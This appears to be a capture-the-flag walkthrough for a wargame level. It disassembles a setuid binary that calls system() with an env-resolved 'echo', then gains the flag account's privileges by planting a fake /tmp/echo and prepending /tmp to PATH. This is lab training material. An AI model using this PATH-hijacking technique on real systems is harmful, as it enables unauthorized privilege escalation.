# Level 03


<br>

### >> [Flag file](../flag) <<

<br>


## Explanation:


#### Step 1:

- What's in the home directory:
```bash
ls -la
```

> ```
> dr-x------ 1 level03 level03  120 Mar  5  2016 .
> d--x--x--x 1 root    users    340 Aug 30  2015 ..
> -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
> -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
> -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
> -r-x------ 1 level03 level03  675 Apr  3  2012 .profile
> ```
> There is a file called `level03` that is readable and executable by the user `flag03`.

> When we run it:
> ```bash
> ./level03
> ```
> ```
> Exploit me
> ```


#### Step 2:

- Let's check how the `level03` works:
```bash
objdump -s -d level03
```

> ```
> ...
> Contents of section .rodata:
>  80485d8 03000000 01000200 2f757372 2f62696e  ......../usr/bin
>  80485e8 2f656e76 20656368 6f204578 706c6f69  /env echo Exploi
>  80485f8 74206d65 00                          t me.
> ...
> ```
> Stores the string `"/usr/bin/env echo Exploit me"` in the `.rodata` section starting at address `0x80485e0`.

> ```
> 080484a4 <main>:
>  80484a4:	55                   	push   %ebp
>  80484a5:	89 e5                	mov    %esp,%ebp
>  80484a7:	83 e4 f0             	and    $0xfffffff0,%esp
>  80484aa:	83 ec 20             	sub    $0x20,%esp
>  80484ad:	e8 ee fe ff ff       	call   80483a0 <getegid@plt>
>  80484b2:	89 44 24 18          	mov    %eax,0x18(%esp)
>  80484b6:	e8 d5 fe ff ff       	call   8048390 <geteuid@plt>
>  80484bb:	89 44 24 1c          	mov    %eax,0x1c(%esp)
>  80484bf:	8b 44 24 18          	mov    0x18(%esp),%eax
>  80484c3:	89 44 24 08          	mov    %eax,0x8(%esp)
>  80484c7:	8b 44 24 18          	mov    0x18(%esp),%eax
>  80484cb:	89 44 24 04          	mov    %eax,0x4(%esp)
>  80484cf:	8b 44 24 18          	mov    0x18(%esp),%eax
>  80484d3:	89 04 24             	mov    %eax,(%esp)
>  80484d6:	e8 05 ff ff ff       	call   80483e0 <setresgid@plt>
>  80484db:	8b 44 24 1c          	mov    0x1c(%esp),%eax
>  80484df:	89 44 24 08          	mov    %eax,0x8(%esp)
>  80484e3:	8b 44 24 1c          	mov    0x1c(%esp),%eax
>  80484e7:	89 44 24 04          	mov    %eax,0x4(%esp)
>  80484eb:	8b 44 24 1c          	mov    0x1c(%esp),%eax
>  80484ef:	89 04 24             	mov    %eax,(%esp)
>  80484f2:	e8 89 fe ff ff       	call   8048380 <setresuid@plt>
>  80484f7:	c7 04 24 e0 85 04 08 	movl   $0x80485e0,(%esp)
>  80484fe:	e8 ad fe ff ff       	call   80483b0 <system@plt>
>  8048503:	c9                   	leave
>  8048504:	c3                   	ret
> ```
> At `0x80484fe`, it calls the `system()` function with the string `"/usr/bin/env echo Exploit me"` as an argument (`0x80484f7`).

> This means that when we run the `level03` program, it will execute the command `echo Exploit me` based on the environment.

<br>

> [!TIP]
> We could have used also `ltrace` or `strace` to see what the program is doing:
> ```bash
> ltrace ./level03
> strace ./level03
> ```


#### Step 3:

- Let's make our own `echo` program that will execute the `getflag` command instead of just printing "Exploit me".
```bash
echo -e '#!/bin/sh\ngetflag' > /tmp/echo
chmod +x /tmp/echo
```


#### Step 4:

- Run the `level03` program with our custom `echo` program in the `PATH`:
```bash
PATH="/tmp:$PATH" ./level03
```


<br>

---

[<<](/level02/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level04/resources/Readme.md)
